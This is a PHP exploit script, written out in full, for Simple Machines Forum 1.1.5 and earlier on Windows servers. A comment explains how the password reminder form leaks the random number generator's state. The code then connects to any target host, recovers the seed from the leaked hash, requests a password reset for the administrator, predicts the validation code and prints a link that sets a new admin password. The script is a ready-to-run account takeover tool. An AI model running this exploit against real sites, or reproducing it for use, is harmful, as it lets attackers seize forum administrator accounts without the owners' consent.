&lt;?php
echo &quot;---------------------------------------------------------------\n&quot;;
echo &quot;SMF &lt;= 1.1.5 Admin Reset Password Exploit (win32-based servers)\n&quot;;
echo &quot;(c)oded by Raz0r (http://Raz0r.name/)\n&quot;;
echo &quot;---------------------------------------------------------------\n&quot;;

if ($argc&lt;3) {
   echo &quot;USAGE:\n&quot;;
   echo &quot;~~~~~~\n&quot;;
   echo &quot;php {$argv[0]} [host] [path] OPTIONS\n\n&quot;;
   echo &quot;[host] - target server where SMF is installed\n&quot;;
   echo &quot;[path] - path to SMF\n\n&quot;;
   echo &quot;OPTIONS:\n&quot;;
   echo &quot;--userid=[value] (default: 1)\n&quot;;
   echo &quot;--username=[value] (default: admin)\n&quot;;
   echo &quot;examples:\n&quot;;
   echo &quot;php {$argv[0]} site.com /forum/\n&quot;;
   echo &quot;php {$argv[0]} site.com / --userid=2 --username=odmen\n&quot;;
   die;
}

/**
* Software site: http://www.simplemachines.org
*
* SMF leaks current state of random number generator through hidden input parameter `sc`
* of the password reminder form:
*
* $_SESSION[&#039;rand_code&#039;] = md5(session_id() . rand());
* $sc = $_SESSION[&#039;rand_code&#039;];
*
* Since max random number generated with rand() on win32 is 32767 and session id
* is known an attacker can reverse the md5 hash and get the random number value.
* On win32 every random number generated with rand() is used as a seed for the next
* random number. So if SMF is installed on win32 platform an attacker can predict
* all the next random numbers. When password reset is requested SMF uses rand()
* function to generate validation code:
*
* $password = substr(preg_replace(&#039;/\W/&#039;, &#039;&#039;, md5(rand())), 0, 10);
*
* So prediction of the validation code is possible and an atacker can set his
* own password for any user.
*
* More information about random number prediction:
* http://www.suspekt.org/2008/08/17/mt_srand-and-not-so-random-numbers/
*
* More information about the behaviour of rand() on win32 (in Russian):
* http://raz0r.name/articles/magiya-sluchajnyx-chisel-chast-2/
*/

set_time_limit(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,10);

$host = $argv[1];
$path = $argv[2];

for($i=3;$i&lt;=$argc;$i++){
   if(isset($argv[$i]) &amp;&amp; strpos($argv[$i],&quot;--userid=&quot;)!==false) {
       list(,$userid) = explode(&quot;=&quot;,$argv[$i]);
   }
   if (isset($argv[$i]) &amp;&amp; strpos($argv[$i],&quot;--username=&quot;)!==false) {
       list(,$username) = explode(&quot;=&quot;,$argv[$i]);
   }
}

if(!isset($userid))$userid=&quot;1&quot;;
if(!isset($username))$username=&quot;admin&quot;;

$sess = md5(mt_rand());
echo &quot;[~] Connecting to $host ... &quot;;
$ock = fsockopen($host,80);
if($ock) echo &quot;OK\n&quot;; else die(&quot;failed\n&quot;);

$packet = &quot;GET {$path}index.php?action=reminder HTTP/1.1\r\n&quot;;
$packet.= &quot;Host: {$host}\r\n&quot;;
$packet.= &quot;Cookie: PHPSESSID=$sess;\r\n&quot;;
$packet.= &quot;Keep-Alive: 300\r\n&quot;;
$packet.= &quot;Connection: keep-alive\r\n\r\n&quot;;

fputs($ock, $packet);

while(!feof($ock)) {
   $resp = fgets($ock);
   preg_match(&#039;@name=&quot;sc&quot; value=&quot;([0-9a-f]+)&quot;@i&#039;,$resp,$out);
   if(isset($out[1])) {
       $md5 = $out[1];
       break;
   }
}

if($md5) {
   $seed = getseed($md5);
   if($seed) {
       echo &quot;[+] Seed for next random number is $seed\n&quot;;
   } else die(&quot;[-] Can&#039;t calculate seed\n&quot;);
}
else die(&quot;[-] Random number hash not found\n&quot;);

function getseed($md5) {
   global $sess;
   for($i=0;$i&lt;=32767;$i++){
       if($md5 == md5($sess . $i)) {
           return $i;
       }
   }
}

$sc = md5($sess . $seed);
$data   = &quot;user=&quot;.urlencode($username).&quot;&amp;sc=$sc&quot;;
$packet = &quot;POST {$path}index.php?action=reminder;sa=mail HTTP/1.1\r\n&quot;;
$packet.= &quot;Host: {$host}\r\n&quot;;
$packet.= &quot;Cookie: PHPSESSID=$sess;\r\n&quot;;
$packet.= &quot;Connection: close\r\n&quot;;
$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n\r\n&quot;;
$packet.= $data;

fputs($ock, $packet);

$resp=&#039;&#039;;
while(!feof($ock)) {
   $resp .= fgets($ock);
}

if(preg_match(&quot;@HTTP/1.(0|1) 200 OK@i&quot;,$resp)===false) {
   die(&quot;[-] An error ocurred while requesting validation code\n&quot;);
}

if(strpos($resp,&quot;javascript:history.go(-1)&quot;)!==false) {
   die(&quot;[-] Invalid username\n&quot;);
}

srand($seed);
for($i=0;$i&lt;6;$i++){
   rand();
}
$password = substr(preg_replace(&#039;/\W/&#039;, &#039;&#039;, md5(rand())), 0, 10);
echo &quot;[+] Success! To set password visit this link:\nhttp://{$host}{$path}index.php?action=reminder;sa=setpassword;u={$userid};code=$password\n&quot;;
?&gt;

